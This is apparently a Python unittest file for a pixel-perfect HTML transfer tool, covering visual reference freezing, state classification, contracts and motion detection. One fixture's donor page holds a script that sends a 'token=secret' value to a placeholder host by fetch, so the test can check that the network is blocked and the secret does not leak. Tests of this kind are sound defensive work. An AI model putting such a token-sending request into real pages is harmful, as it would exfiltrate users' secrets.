from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


SKILL = Path(__file__).resolve().parents[1] / "skills" / "h2d-pixel-perfect-transfer"


def playwright_available() -> bool:
    return subprocess.run(["node", "-e", "require('playwright'); console.log('ok')"], cwd=SKILL, capture_output=True).returncode == 0


@unittest.skipUnless(playwright_available(), "playwright is installed by the H2D CI job")
class BrowserGateTests(unittest.TestCase):
    def test_classification_reaches_hidden_motion_state(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp); donor = root / "donor.html"; h2d = root / "source.h2d"
            donor.write_text("""<!doctype html><style>#modal{display:none}.spin{animation:pulse 1s infinite}@keyframes pulse{50%{transform:scale(1.1)}}</style><button id='open'>Open</button><div id='modal'><div class='spin'>Animated modal</div></div><script>document.getElementById('open').onclick=()=>document.getElementById('modal').style.display='block'</script>""", encoding="utf-8")
            h2d.write_text("{}", encoding="utf-8")
            matrix = root / "matrix.json"; profiles = root / "profiles.json"; visual_out = root / "visual"; classification = root / "classification.json"
            matrix.write_text(json.dumps([{"width":390,"height":844,"kind":"decoded"}]), encoding="utf-8")
            profiles.write_text(json.dumps([{"id":"mobile","headless":True,"device_scale_factor":1,"is_mobile":True,"has_touch":True,"locale":"en-US","timezone":"UTC","reduced_motion":"reduce"}]), encoding="utf-8")
            subprocess.run(["node", str(SKILL / "scripts" / "freeze_visual_reference.js"), "--donor", str(donor), "--donor-root", str(root), "--matrix", str(matrix), "--profiles", str(profiles), "--out-dir", str(visual_out), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            subprocess.run(["node", str(SKILL / "scripts" / "classify_reference.js"), "--donor", str(donor), "--donor-root", str(root), "--h2d", str(h2d), "--matrix", str(matrix), "--profiles", str(profiles), "--visual-manifest", str(visual_out / "visual_reference_manifest.json"), "--out", str(classification), "--project-root", str(SKILL), "--max-states", "12"], cwd=SKILL, check=True)
            report = json.loads(classification.read_text(encoding="utf-8"))
            self.assertEqual(report["result"], "pass")
            self.assertTrue(report["behavior_required"])
            self.assertTrue(report["liveness_required"])
            self.assertGreaterEqual(len(report["rows"][0]["states"]), 2)

    def test_raw_h2d_to_atomic_bundle_and_contract(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp); output = root / "output"; contract_dir = output / "contract"; reference = contract_dir / "reference"; candidate = root / "candidate"
            candidate.mkdir(parents=True); (candidate / "index.html").write_text("<h1>Candidate meaning</h1>", encoding="utf-8")
            (candidate / "generate.py").write_text("print('pinned gate input')\n", encoding="utf-8")
            nodes = [{"type":"TEXT","tag":"span","x":10,"y":20+i*30,"width":200,"height":24,"text":f"Donor text {i}","children":[]} for i in range(12)]
            h2d = root / "source.h2d"; h2d.write_text(json.dumps({"width":390,"height":844,"frame":{"type":"FRAME","tag":"div","x":0,"y":0,"width":390,"height":844,"children":nodes}}), encoding="utf-8")
            donor = root / "donor.html"; donor.write_text("<!doctype html><h1>Visual donor</h1>", encoding="utf-8")
            matrix = contract_dir / "matrix.json"; profiles = contract_dir / "profiles.json"; heights = contract_dir / "heights.json"; contract_dir.mkdir(parents=True)
            matrix.write_text(json.dumps([{"width":390,"height":844,"kind":"decoded"}]), encoding="utf-8")
            profiles.write_text(json.dumps([{"id":"headless","headless":True,"device_scale_factor":1,"is_mobile":False,"has_touch":False,"locale":"en-US","timezone":"UTC","reduced_motion":"reduce"}]), encoding="utf-8")
            heights.write_text(json.dumps({"390":844}), encoding="utf-8")
            subprocess.run([sys.executable, str(SKILL / "scripts" / "freeze_reference_bundle.py"), "--h2d", str(h2d), "--donor", str(donor), "--donor-root", str(root), "--matrix", str(matrix), "--profiles", str(profiles), "--out", str(reference), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            contract = contract_dir / "transfer_contract.json"
            subprocess.run([sys.executable, str(SKILL / "scripts" / "create_transfer_contract.py"), "--h2d", str(h2d), "--workspace-root", str(root), "--candidate-root", str(candidate), "--candidate-include", "index.html", "--candidate-include", "generate.py", "--profiles", str(profiles), "--height-map", str(heights), "--reference-bundle", str(reference / "reference_bundle.json"), "--current-command", json.dumps([sys.executable, "generate.py"]), "--expected-report", "reports/diff_summary.json", "--expected-report", "reports/node_validation.json", "--expected-report", "reports/font_manifest.json", "--expected-report", "reports/matrix_coverage.json", "--expected-report", "reports/review.md", "--out", str(contract)], cwd=SKILL, check=True)
            sys.path.insert(0, str(SKILL / "scripts"))
            from evidence_integrity import verify_contract
            verified = verify_contract(contract, output)
            self.assertEqual(verified["contract"]["matrix_keys"], ["390x844@headless"])

    def test_offline_freeze_blocks_external_network_and_covers_matrix(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            donor = root / "donor.html"
            (root / "theme.css").write_text("body{margin:0;background:#eee}h1{font:700 32px Arial}", encoding="utf-8")
            donor.write_text("""<!doctype html><link rel="stylesheet" href="theme.css"><h1>Donor</h1><script>fetch('https://example.invalid/write?token=secret').catch(()=>{});</script>""", encoding="utf-8")
            matrix = root / "matrix.json"; profiles = root / "profiles.json"; out = root / "reference"; h2d = root / "source.h2d"
            h2d.write_text("{}", encoding="utf-8")
            matrix.write_text(json.dumps([{"width": 390, "height": 844, "kind": "decoded"}, {"width": 768, "height": 900, "kind": "interval-probe"}]), encoding="utf-8")
            profiles.write_text(json.dumps([
                {"id":"desktop","headless":True,"device_scale_factor":1,"is_mobile":False,"has_touch":False,"locale":"en-US","timezone":"UTC","reduced_motion":"reduce"},
                {"id":"mobile","headless":True,"device_scale_factor":2,"is_mobile":True,"has_touch":True,"locale":"en-US","timezone":"UTC","reduced_motion":"reduce"},
            ]), encoding="utf-8")
            subprocess.run(["node", str(SKILL / "scripts" / "freeze_visual_reference.js"), "--donor", str(donor), "--donor-root", str(root), "--matrix", str(matrix), "--profiles", str(profiles), "--out-dir", str(out), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            manifest = json.loads((out / "visual_reference_manifest.json").read_text(encoding="utf-8"))
            self.assertEqual(manifest["result"], "pass")
            self.assertEqual(sorted(manifest["matrix_keys"]), ["390x844@desktop", "390x844@mobile", "768x900@desktop", "768x900@mobile"])
            self.assertTrue(all(row["blocked_requests"] >= 1 for row in manifest["rows"]))
            self.assertNotIn("secret", json.dumps(manifest))
            self.assertEqual({row["path"] for row in manifest["donor_closure"]}, {"donor.html", "theme.css"})
            self.assertEqual(set(manifest["environment_by_profile"]), {"desktop", "mobile"})
            self.assertTrue(all("renderer" in row["environment"]["graphics"] for row in manifest["rows"]))
            original_identity = manifest["donor_identity"]
            (root / "theme.css").write_text("body{margin:0;background:#111}h1{font:700 32px Arial}", encoding="utf-8")
            stale_classification = subprocess.run(["node", str(SKILL / "scripts" / "classify_reference.js"), "--donor", str(donor), "--donor-root", str(root), "--h2d", str(h2d), "--matrix", str(matrix), "--profiles", str(profiles), "--visual-manifest", str(out / "visual_reference_manifest.json"), "--out", str(root / "stale-classification.json"), "--project-root", str(SKILL)], cwd=SKILL, capture_output=True, text=True)
            self.assertNotEqual(stale_classification.returncode, 0)
            self.assertIn("donor closure changed", stale_classification.stderr)
            changed = root / "changed-reference"
            subprocess.run(["node", str(SKILL / "scripts" / "freeze_visual_reference.js"), "--donor", str(donor), "--donor-root", str(root), "--matrix", str(matrix), "--profiles", str(profiles), "--out-dir", str(changed), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            changed_manifest = json.loads((changed / "visual_reference_manifest.json").read_text(encoding="utf-8"))
            self.assertNotEqual(changed_manifest["donor_identity"], original_identity)

    def test_idless_controls_get_unique_dom_relative_selectors(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp); donor = root / "donor.html"; out = root / "inventory.json"
            donor.write_text("<!doctype html><div><button>One</button><button>Two</button></div>", encoding="utf-8")
            subprocess.run(["node", str(SKILL / "scripts" / "behavior_inventory.js"), "--url", str(donor), "--out", str(out), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            report = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(report["result"], "pass")
            self.assertEqual(len({row["selector"] for row in report["components"]}), 2)
            self.assertTrue(all(row["selector_count"] == 1 for row in report["components"]))

    def test_css_only_motion_is_required(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp); donor = root / "donor.html"; out = root / "liveness.json"
            donor.write_text("<!doctype html><style>.tile{width:40px;height:40px;transition:transform 1s}.tile:hover{transform:translateX(20px)}</style><div class='tile'></div>", encoding="utf-8")
            subprocess.run(["node", str(SKILL / "scripts" / "liveness_inventory.js"), "--url", str(donor), "--out", str(out), "--project-root", str(SKILL)], cwd=SKILL, check=True)
            report = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(report["result"], "pass")
            self.assertTrue(report["liveness_required"])
            self.assertTrue(any(row["kind"] == "css-transition" and "hover" in row["triggers"] for row in report["surfaces"]))


if __name__ == "__main__":
    unittest.main()
